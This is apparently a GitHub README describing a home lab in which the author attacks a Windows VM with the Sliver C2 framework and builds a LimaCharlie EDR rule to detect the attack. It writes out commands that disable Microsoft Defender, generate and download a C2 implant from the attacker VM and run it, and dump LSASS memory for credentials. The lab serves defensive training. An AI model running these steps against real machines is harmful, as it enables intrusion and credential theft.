# EDR Attack and Defense Home Lab 
Endpoint Security and Threat Simulation Using Sliver C2 for threat simulation and LimaCharlie for EDR

# EDR Attack and Defense Home Lab

## Overview
This project is designed to simulate real-world cybersecurity scenarios, focusing on both attack and defense. I set up a home lab using virtual machines to simulate a Ubuntu attacker (using Sliver C2) and a Windows VM victim (protected by LimaCharlie EDR). The goal was to understand endpoint security, threat detection, and incident response in a controlled environment.

## Tools Used
- **Sliver**: Command and Control (C2) framework
- **LimaCharlie**: Endpoint Detection and Response (EDR) and SIEM platform
- **VMware Workstation Pro**: Virtualization software
- **Ubuntu Server 22.04.1**: Attack machine
- **Windows 11**: Victim machine

---

## Step-by-Step Walkthrough

# Setting Up a Virtualization Environment

Firstly, I set up a small virtualization environment. This was an essential foundation for my attack and defense simulations.

---

## Setting Up the Windows VM

### Downloading and Importing the VM
I download a free Windows 11 VM ISO from Microsoft’s site.

### First Boot
1. Powered on the Windows VM.
2. Logged in automatically as the user called 'localadmin'.

---

## Setting Up the Ubuntu VM

### Downloading Ubuntu Server
I went for Ubuntu Server 22.04.1 because it comes pre-installed with necessary packages, making the setup much easier than using the Desktop version.

### VM Configuration
Here are the specs I used for the Ubuntu VM:
- Disk size: 14GB
- CPU cores: 2
- RAM: 2GB

I created the VM in VMware using the Ubuntu Server ISO and left most installation settings as defaults.

### Static IP Configuration
To ensure stable communication between the VMs:
1. Opened VMware’s **Virtual Network Editor**.
2. Noted the **Subnet IP** and **Gateway IP** from the NAT network settings.
3. In the Ubuntu installer, switched from DHCPv4 to Manual configuration.
4. Entered the noted IPs, adding `/24` to the subnet IP.
5. Completed the network setup and wrote down the assigned static IP.

### Finalizing Ubuntu Setup
1. Set a memorable username and password for the VM
2. Installed the OpenSSH server when prompted.
3. Rebooted the system.
4. Performed a connectivity check:
   ```bash
   ping -c 2 google.com
   ```
   Seeing successful pings confirmed everything was working correctly up so far.

---

## Disabling Microsoft Defender on Windows VM
This was an important step to ensure the lab environment didn’t interfere with the attack simulations. Missing anything here would mean redoing a lot of steps.

### Steps to Disable Defender
1. **Disable Tamper Protection:**
   - Navigated to **Privacy & Security > Windows Security > Virus & Threat Protection > Manage Settings**.
   - Turned off **Tamper Protection** and all other options.
![Picture1](https://github.com/user-attachments/assets/f69234eb-4ecc-44ef-b297-424e6b995702)

![Picture2](https://github.com/user-attachments/assets/d1899835-b91d-4e5f-b576-f4cd8c14bfab)

2. **Group Policy Editor:**
   - Opened the Local Group Policy Editor using:
     ```cmd
     gpedit.msc
     ```
   - Enabled the setting: **Turn off Microsoft Defender Antivirus**.
![Picture3](https://github.com/user-attachments/assets/3f9f5290-66e4-4fe4-8cf4-bfe1fc8cb159)

3. **Registry Edits:**
   - Ran the following command in an elevated command prompt:
     ```cmd
     REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
     ```

4. **Safe Mode Adjustments:**
   - Booted into Safe Mode and disabled several Defender services in the Registry by setting their `Start` values to `4`.
![Picture5](https://github.com/user-attachments/assets/f57043b8-3ff8-4f1d-9d06-7cc349a2a134)

![Picture6](https://github.com/user-attachments/assets/af916feb-1db6-4f7b-b4ef-fb474845e685)

![Picture7](https://github.com/user-attachments/assets/f33787c4-daee-4dbd-ba72-68479caf22b6)

![Picture8](https://github.com/user-attachments/assets/8d611128-fefe-478a-a7e6-804455bf4b24)

![Picture9](https://github.com/user-attachments/assets/4642f18e-d27a-4e2d-a830-dd95c2d94c8d)

![Picture10](https://github.com/user-attachments/assets/9f1f3666-3f8f-447d-90ca-1fabe712b518)

![Picture11](https://github.com/user-attachments/assets/458c87b2-221a-46ac-994f-ea6f5eab94a7)

5. Rebooted back into the normal desktop environment.

![Picture12](https://github.com/user-attachments/assets/87270251-3343-4d70-a292-dc9ce5999f77)


---

## Preventing Sleep Mode
To keep the Windows VM running without interruptions:
```powershell
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
powercfg /change hibernate-timeout-ac 0
powercfg /change hibernate-timeout-dc 0
```
![Picture13](https://github.com/user-attachments/assets/172184d2-1239-4253-b4db-841fe4058da7)

---

## Installing Sysmon on Windows VM
Although not directly required for the initial setup and not directly used in the project, Sysmon is a must-have for telemetry. Here’s what I did (just for familiarizing myself with it purposes):
1. Downloaded Sysmon:
   ```powershell
   Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
   ```
![Picture14](https://github.com/user-attachments/assets/f01d8296-3082-4f33-ab14-c160ad8d2908)


2. Unzipped the package and downloaded a configuration file from SwiftOnSecurity:
   ```powershell
   Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
   Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
   ```
3. Installed Sysmon with the configuration file:
   ```powershell
   C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
   ```
4. Verified the installation:
   ```powershell
   Get-Service sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```
![Picture15](https://github.com/user-attachments/assets/8193349e-73b2-4f72-ba9b-517d34bed5b5)

![Picture16](https://github.com/user-attachments/assets/e098090a-afc7-483f-baa1-ce43dfe233f0)

---

## Setting Up LimaCharlie on the Windows VM

### Creating a New Organization in LimaCharlie
1. Logged into my [LimaCharlie account](https://limacharlie.io/) and created a new organization.
2. Navigated to the **Organizations** tab and clicked **Create Organization**.
3. Named the organization appropriately and took note of the organization ID for future use.


![Picture18](https://github.com/user-attachments/assets/b37e25ca-0a0a-4b87-8732-83d0ab42c02a)

![Picture19](https://github.com/user-attachments/assets/6cb6323e-f62f-4650-b3c3-f082659958bc)

![Picture20](https://github.com/user-attachments/assets/691cd0e9-cc85-4641-b896-506164cbb001)


### Downloading the LimaCharlie Sensor
1. Went to the **Setup** section of the newly created organization.
2. Downloaded the **lc_sensor.exe** file provided for Windows installations.

### Installing and Registering the Sensor
1. Transferred the `lc_sensor.exe` file to the Windows VM.
2. Opened an Administrative PowerShell console and executed the following command to register the sensor with the organization:
   ```powershell
   .\lc_sensor.exe -i <organization_id>
   ```
3. Verified successful installation by checking that the LimaCharlie sensor appeared as an active endpoint in the **Sensors** tab of the LimaCharlie dashboard.

![Picture21](https://github.com/user-attachments/assets/b07ae865-b797-44e3-a7aa-355f8d6136d9)

![Picture22](https://github.com/user-attachments/assets/31e9fa38-e08f-44ad-80af-1e5fd5400baa)

![Picture23](https://github.com/user-attachments/assets/393e27e8-2a8a-44c0-b90b-cee117ff5d45)

I also create a sensor and an artifact collection rule as shown:

![Picture23](https://github.com/user-attachments/assets/aa89282b-b11a-40ad-a9ec-678dbafc5145)

![Picture24](https://github.com/user-attachments/assets/019bcb06-d8ae-4416-b572-b1550c384bd4)

I then take a snapshot since the lab setup is now ready

![Picture25](https://github.com/user-attachments/assets/12233e20-c119-4bc9-a894-a0b7b306c1fa)


# Generating and Observing C2 Payloads

Here is where I step into the attacker’s shoes to generate and deploy a C2 payload using the Sliver C2 framework. This experience gave me hands-on exposure to adversarial tactics and how EDR systems like LimaCharlie detect them. So, now we switch over to ubuntu VM installed earlier to set up the attack system – silver c2

![Picture26](https://github.com/user-attachments/assets/829b570f-edc6-4182-bb23-6872a58124b7)

![Picture27](https://github.com/user-attachments/assets/42abcf24-ac1f-4b03-bf83-c5164eefa865)

![Picture28](https://github.com/user-attachments/assets/b918d846-22f6-43af-8fdc-15674320880c)


---

## Setting Up Sliver and Generating the Payload

To begin, I jumped into an SSH session on my Ubuntu attack VM and navigated to the Sliver installation directory:

```bash
sudo su
cd /opt/sliver
```

From here, I launched the Sliver server:

```bash
sliver-server
```



Within the Sliver shell, I generated a C2 session payload, ensuring it used the statically assigned IP of my attack VM:

```bash
generate --http [Linux_VM_IP] --save /opt/sliver
```

![Picture29](https://github.com/user-attachments/assets/5acb3d06-2c71-463a-a19a-240e85b95213)

Pulling payload down onto victim windows via python http server

![Picture30](https://github.com/user-attachments/assets/f0a9aaad-d1f0-4197-9564-19410adede60)

![Picture31](https://github.com/user-attachments/assets/daadeb43-6626-4042-b052-0c13362d2618)

![Picture32](https://github.com/user-attachments/assets/a4bda2d8-a7d2-449c-bf79-d5d8e4a39fa4)
now this terminal is logged into ubunto box and ssh’ing into it

![Picture33](https://github.com/user-attachments/assets/b3df5484-b59d-4cb6-9d26-16b2cb09c89a)

downloading silver c2 to ubuntu box 

made it executable:

![Picture34](https://github.com/user-attachments/assets/cef50254-b2d2-46b1-9dbe-31d222e15f1c)

installed mingw-w64 for additional capabilities:

![image](https://github.com/user-attachments/assets/b76eda73-ef23-4898-92e7-d5728313a005)


This created a unique payload file, which I noted for future reference. The `implants` command within Sliver confirmed the configuration of my new payload:

```bash
implants
```

After verifying the implant, I exited Sliver to prepare for transferring the payload to the target Windows VM.

---

## Transferring the Payload

To transfer the payload, I spun up a temporary Python web server on the Ubuntu VM:

```bash
cd /opt/sliver
python3 -m http.server 80
```

Switching to the Windows VM, I opened an Administrative PowerShell console and downloaded the payload:

```powershell
IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
```

At this point, I took a snapshot of the Windows VM, naming it **"Malware staged"**. This ensured I could revert to a clean state if needed.

---

## Executing the Payload

Back on the Ubuntu VM, I relaunched Sliver and started the HTTP listener to catch callbacks from the implant:

```bash
sliver-server
http
```

Returning to the Windows VM, I executed the payload from the Administrative PowerShell console:

```powershell
C:\Users\User\Downloads\[payload_name].exe
```

Within moments, the session checked in on the Sliver server. I verified the active session:

```bash
sessions
```

To interact with the session, I used:

```bash
use [session_id]
```

---

## Exploring the Victim System

Once the session was active, I ran several basic commands to explore the victim system:

1. **Session Details:**
   ```bash
   info
   ```

2. **User and Privileges:**
   ```bash
   whoami
   getprivs
   ```
   This confirmed the implant had administrative privileges, including the critical `SeDebugPrivilege`.

3. **Working Directory:**
   ```bash
   pwd
   ```

4. **Network Connections:**
   ```bash
   netstat
   ```
   Sliver highlighted its own process in green, making it easy to spot.

5. **Running Processes:**
   ```bash
   ps -T
   ```
   Defensive tools, like LimaCharlie’s `rphcp.exe`, were marked in red.

---

## Observing EDR Telemetry in LimaCharlie

With the C2 session established, I switched to LimaCharlie’s web UI to observe the telemetry:

### Processes Tab
- The process tree displayed all running processes, highlighting the unsigned C2 implant.
- Hovering over icons provided additional context, reinforcing the importance of understanding normal process behavior.

### Network Tab
- Active connections, including those initiated by the implant, were easily identifiable.
- Searching for the implant’s name or C2 IP address quickly pinpointed suspicious activity.

### File System Tab
- Browsed to the implant’s directory: `C:\Users\User\Downloads`.
- Scanned the executable’s hash with VirusTotal. As expected, it wasn’t in the database, making it more suspicious.

### Timeline Tab
- Filtered logs by known Indicators of Compromise (IOCs) like the implant name and C2 IP.
- Tracked events such as `SENSITIVE_PROCESS_ACCESS` when enumerating privileges earlier.

---

# Emulating an Adversary for Detection Crafting

Now I use the setup to detect suspicious activities. The goal was to not just replicate attacker behavior but to create a meaningful detection rule to identify these activities in real-time.

---

## Privilege Check

Before proceeding, I ensured the implant had sufficient privileges:

```bash
getprivs
```

The key privilege to look for was `SeDebugPrivilege`, which, as I learned, is important for advanced actions like credential dumping. If this privilege wasn’t present, I would relaunch the implant with administrative rights as mentioned in the guide.

---

## Credential Dumping: Targeting LSASS

One of the most common adversarial techniques involves dumping the `lsass.exe` process from memory to extract credentials. Here’s how I simulated this:

1. Ran the following command in the Sliver session:
   ```bash
   procdump -n lsass.exe -s lsass.dmp
   ```
2. This dumped the process memory and saved it as `lsass.dmp` on the Sliver C2 server.

Although I didn’t process the dump further, the activity itself generated telemetry that I could analyze in the EDR. This technique is an excellent test for any EDR's ability to detect credential dumping attempts.

### Troubleshooting
- If the command failed (e.g., RPC error), I confirmed the implant was running with admin rights.
- Even a failed attempt can generate valuable telemetry for detection, which is what happened to me.

---

## Diving into LimaCharlie: Detecting LSASS Access

Switching to LimaCharlie, I began searching for telemetry related to the LSASS dump:

### Timeline Analysis

1. Opened the **Timeline** view for my Windows VM sensor.
2. Filtered events by type: `SENSITIVE_PROCESS_ACCESS`.
3. Scanned the results for any events involving `lsass.exe`. Since LSASS is rarely accessed legitimately, any such event was a strong indicator of malicious activity.

## Creating a Detection Rule

With the telemetry in hand, I moved to the D&R (Detection and Response) engine in LimaCharlie to create a rule:

### Detection Logic

### Response Action

1. In the **Respond** section, I added:
   ```yaml
   - action: report
     name: LSASS access
   ```
   For simplicity, the rule generated a detection report whenever triggered. More advanced actions like killing the offending process could be added later.

### Testing the Rule

1. Used the "Target Event" feature to test the rule against the telemetry.
2. Confirmed a successful match, with the engine highlighting the exact event details.
3. Saved the rule as "LSASS access" and enabled it.

---

## Validating the Detection Rule

Returning to the Sliver session, I reran the LSASS dump command:

```bash
procdump -n lsass.exe -s lsass.dmp
```

Back in LimaCharlie:

1. Opened the **Detections** tab.
2. Found a new detection entry corresponding to the second LSASS dump attempt.
3. Expanded the detection to view the raw event data, which displayed the title of the detection rule I created.
4. Verified that it worked and detected the event automatically by navigating to the exact timeline event using the "View Event Timeline" option.

---

### Configuring the Detection Output

To ensure I am notified whenever the detection rule is triggered, I took it a step further and configured the output to be sent to a webhook. Here's how I set it up:

1. Generated a unique webhook URL using [`https://webhook.site/`](https://webhook.site/).
2. Configured the detection rule in LimaCharlie to send its output to the generated webhook.

---

## References
- Eric Capuano’s Guide: [So You Want to Be a SOC Analyst?](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro)
- [Sliver C2 Documentation](https://github.com/BishopFox/sliver)
- [LimaCharlie Documentation](https://limacharlie.io/)

---

Feel free to explore this repository and try the steps yourself! This was an incredibly rewarding project, and I’d love to hear your thoughts or answer any questions!
